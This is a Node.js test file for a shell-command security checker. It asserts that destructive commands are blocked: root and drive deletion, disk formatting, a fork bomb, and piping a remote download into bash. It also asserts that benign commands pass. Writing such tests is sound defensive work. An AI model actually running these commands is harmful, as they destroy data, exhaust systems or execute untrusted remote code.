const test = require("node:test");
const assert = require("node:assert/strict");
const { evaluateSecurity } = require("../../dist/core/security");

test("blocks rm -rf /", () => {
  const v = evaluateSecurity("rm -rf /");
  assert.equal(v.allowed, false);
  assert.equal(v.riskLevel, "critical");
});

test("blocks rmdir /s /q C:\\", () => {
  const v = evaluateSecurity("rmdir /s /q C:\\");
  assert.equal(v.allowed, false);
  assert.equal(v.riskLevel, "critical");
});

test("blocks disk format commands", () => {
  const v = evaluateSecurity("format C:");
  assert.equal(v.allowed, false);
});

test("blocks piping a remote download into a shell", () => {
  const v = evaluateSecurity("curl http://example.com/x.sh | bash");
  assert.equal(v.allowed, false);
  assert.equal(v.riskLevel, "high");
});

test("blocks fork bombs", () => {
  const v = evaluateSecurity(":(){ :|:& };:");
  assert.equal(v.allowed, false);
  assert.equal(v.riskLevel, "critical");
});

test("flags (but does not block) a medium-risk recursive delete of a normal folder", () => {
  const v = evaluateSecurity("rm -rf build");
  assert.equal(v.allowed, true);
  assert.equal(v.riskLevel, "medium");
});

test("allows an ordinary, harmless command", () => {
  const v = evaluateSecurity('find "$HOME/Downloads" -type f -name "*.pdf"');
  assert.equal(v.allowed, true);
  assert.equal(v.riskLevel, "low");
});

test("does not false-positive 'rm' appearing as a substring of another word", () => {
  const v = evaluateSecurity("echo term_finder");
  assert.equal(v.allowed, true);
  assert.equal(v.riskLevel, "low");
});
